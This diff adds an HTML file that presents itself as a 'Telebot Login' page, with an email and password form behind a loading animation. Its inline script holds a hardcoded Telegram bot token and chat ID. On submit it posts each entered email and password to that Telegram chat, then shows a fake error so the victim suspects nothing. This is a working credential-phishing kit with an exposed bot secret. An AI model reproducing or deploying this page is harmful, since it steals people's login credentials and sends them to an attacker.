@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telebot Login</title>
+    <style>
+        :root {
+            --body-bg-color: #414747;
+            --form-bg-color: #4E5454;
+            --form-border-color: #424848;
+            --heading-text-color: #FFFFFF;
+            --input-text-color: #333333;
+            --button-text-color: #080B0B;
+            --message-text-color: #A3ADAE;
+            --input-bg-color: #f9f9f9;
+            --input-border-color: #cccccc;
+            --button-bg-color: #A2ADAE;
+            --button-hover-bg-color: #0056b3;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Arial', sans-serif;
+            background-color: var(--body-bg-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            flex-direction: column;
+        }
+
+        h1 {
+            color: var(--heading-text-color);
+            margin-bottom: 20px;
+            font-size: 36px;
+            font-weight: bold;
+            text-align: center;
+        }
+
+        /* Dot Loading Animation */
+        .dot-loader {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .dot {
+            width: 15px;
+            height: 15px;
+            margin: 0 5px;
+            border-radius: 50%;
+            background-color: #FF5733;
+            animation: dotAnimation 1.5s infinite ease-in-out;
+        }
+
+        .dot:nth-child(1) {
+            animation-delay: 0s;
+        }
+
+        .dot:nth-child(2) {
+            animation-delay: 0.3s;
+        }
+
+        .dot:nth-child(3) {
+            animation-delay: 0.6s;
+        }
+
+        @keyframes dotAnimation {
+            0%, 100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+            50% {
+                transform: scale(1.5);
+                opacity: 0.5;
+            }
+        }
+
+        form {
+            background-color: var(--form-bg-color);
+            border: 1px solid var(--form-border-color);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            box-sizing: border-box;
+            opacity: 0;
+            animation: fadeIn 1s forwards 3s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        label {
+            font-size: 16px;
+            color: var(--heading-text-color);
+            display: block;
+            margin-bottom: 8px;
+            text-align: left;
+        }
+
+        .input-field {
+            width: 100%;
+            margin: 10px 0;
+            padding: 12px;
+            border: 1px solid var(--input-border-color);
+            border-radius: 5px;
+            background-color: var(--input-bg-color);
+            font-size: 16px;
+            color: var(--input-text-color);
+            box-sizing: border-box;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: var(--button-bg-color);
+        }
+
+        button {
+            padding: 12px 20px;
+            background-color: var(--button-bg-color);
+            color: var(--button-text-color);
+            border: none;
+            border-radius: 80px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 100s;
+            width: 20%;
+            box-sizing: border-box;
+        }
+
+        button:hover {
+            background-color: var(--button-hover-bg-color);
+        }
+
+        .footer {
+            color: var(--message-text-color);
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .footer a {
+            color: var(--message-text-color);
+            text-decoration: none;
+        }
+
+        /* Mobile responsiveness */
+        @media (max-width: 480px) {
+            h1 {
+                font-size: 28px;
+            }
+
+            form {
+                padding: 15px;
+            }
+
+            .input-field {
+                padding: 10px;
+                font-size: 14px;
+            }
+
+            button {
+                padding: 10px;
+                font-size: 14px;
+            }
+
+            .footer {
+                font-size: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Dot Loading Animation -->
+    <div class="dot-loader">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+    </div>
+
+    <!-- Login Form -->
+    <form id="loginForm">
+        <h1>Login</h1>
+
+        <label for="email">Email</label>
+        <input type="email" id="email" class="input-field" placeholder="Your Email here" required>
+
+        <label for="password">Password</label>
+        <input type="password" id="password" class="input-field" placeholder="Your Password here" required>
+
+        <button type="submit">Login</button>
+
+        <p class="footer">
+            © Copy Claims By <a href="#">Telebot Creator</a>
+        </p>
+    </form>
+
+    <script>
+        const BOT_TOKEN = "7729443623:AAHtfRQuzfTSS8o6wjuHXXY3XmASXZEzI5E";
+        const CHAT_ID = "7480276527";
+
+        // Remove the dot loader after the animation ends
+        setTimeout(function() {
+            document.querySelector('.dot-loader').style.display = 'none';
+        }, 3000); // 3 seconds to match the animation duration
+
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            const message = `New Login Attempt:\nEmail: ${email}\nPassword: ${password}`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert('Errir');
+                } else {
+                    alert('Failed to send message to Telegram.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('An error occurred.');
+            });
+        });
+    </script>
+</body>
+</html>
